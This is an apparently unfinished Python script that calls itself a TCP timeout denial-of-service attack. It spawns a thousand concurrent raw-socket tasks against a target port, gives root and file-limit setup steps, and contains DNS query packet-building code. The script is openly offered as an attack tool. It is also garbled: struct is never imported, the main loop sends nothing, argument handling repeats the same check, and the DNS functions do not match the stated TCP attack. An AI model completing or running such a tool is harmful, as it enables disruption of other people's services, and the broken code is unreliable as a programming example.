#!/usr/bin/env python3

import socket
import asyncio
import random
import sys

# This script performs a TCP timeout DOS attack against an open TCP port.
###### You must run this script as root to send raw packets #########
###### This only runs on linux #########

# Delay factor, some noise is added.
DELAY = 5

# Number of concurrent requests that are happening, threads are not used.
# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
# and add a line like vita soft nofile 2000
# and vita hard nofile 40000
# You can check the status of these limits with ulimit -Hn and ulimit -Sn
CONCURRENT_REQUESTS = 1000 

# Prints the string with no newline, and flushes.
def pfl(s: str):
    print(s, end='')
    sys.stdout.flush()

async def hit_server(target: str):
    await asyncio.gather(
        *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
        )

def send_packet(self):
    packet = self.build_packet()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    sock.sendto(bytes(packet), (self.ip, self.port))
    data, addr = sock.recvfrom(1024)
    sock.close()
    return data  # reomove this later for the attack

def build_packet(self):
    randomint = random.randint(0, 65535)
    packet = struct.pack(">H", randomint)
    packet += struct.pack(">H", 0x0100)
    packet += struct.pack(">H", 1)
    packet += struct.pack(">H", 0)
    packet += struct.pack(">H", 0)
    packet += struct.pack(">H", 0)
    split_url = self.url.split(".")
    for part in split_url:
        packet += struct.pack("B", len(part))
        for s in part:
            packet += struct.pack('c', s.encode())
    packet += struct.pack("B", 0)
    packet += struct.pack(">H", 1)
    packet += struct.pack(">H", 1)
    return packet

# Single job that will keep attempting to 
# send requests to the server that _will_ time out.
async def papercut(target: str, i):
    # AF_PACKET needs root
    soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW) 
    soc.bind("wlp1s0", 0)
    pfl('N') # new

    while True:

        pfl('S') # sent a packet
        await asyncio.sleep(random.random()*DELAY)
    soc.close() # probably never gets here

if __name__ == '__main__':
    import sys
    target = None
    if len(sys.argv) == 1:
        target = ('localhost', 80) # some open tcp port
    elif len(sys.argv) == 1:
        target = sys.argv[1]
    asyncio.run(hit_server(target))
